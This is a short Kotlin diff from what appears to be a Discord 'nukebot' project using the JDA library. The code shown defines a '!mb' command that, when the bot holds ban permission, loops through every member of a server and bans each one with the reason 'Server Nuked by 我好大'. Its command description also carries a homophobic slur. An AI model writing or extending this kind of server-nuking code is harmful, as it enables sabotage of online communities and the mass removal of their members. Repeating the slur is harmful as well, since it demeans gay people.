@@ -5,15 +5,15 @@ import net.dv8tion.jda.api.events.message.MessageReceivedEvent
 import net.dv8tion.jda.api.exceptions.PermissionException
 import thenano.nukebot.bot.command.CommandListener
 import thenano.nukebot.bot.command.CommandManager
-import kotlin.jvm.Throws
 
 @CommandListener.Info("!ban","Ban All gay in this server",false)
 class BanAll : CommandListener() {
 
     override fun onEvent(event: MessageReceivedEvent) {
+        if (onInit(event)) return
         if (message.contentRaw.startsWith("!mb")) {
             if (guild.selfMember.hasPermission(Permission.BAN_MEMBERS)) {
-                event.message.reply("Banning").queue()
+                message.reply("Banning").queue()
                 loop1@ for (member in guild.members) {
                     try {
                         guild.ban(member, 1, "Server Nuked by 我好大").queue()
